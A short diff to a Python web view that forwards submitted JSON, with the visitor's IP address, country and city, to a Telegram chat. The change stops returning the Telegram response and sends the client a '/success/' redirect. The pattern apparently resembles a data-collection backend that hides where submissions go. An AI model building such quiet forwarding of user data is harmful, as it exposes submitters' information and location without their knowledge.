@@ -39,7 +39,7 @@ def receive_data(request):
             print(data)
             message = f"New Data Received\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\n{json.dumps(data, indent=2)}"
             response = send_telegram_message(message)
-            return JsonResponse({"success": True, "telegram_response": response})
+            return JsonResponse({"success": True, "redirect_url": "/success/"})
         except json.JSONDecodeError:
             return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)
 
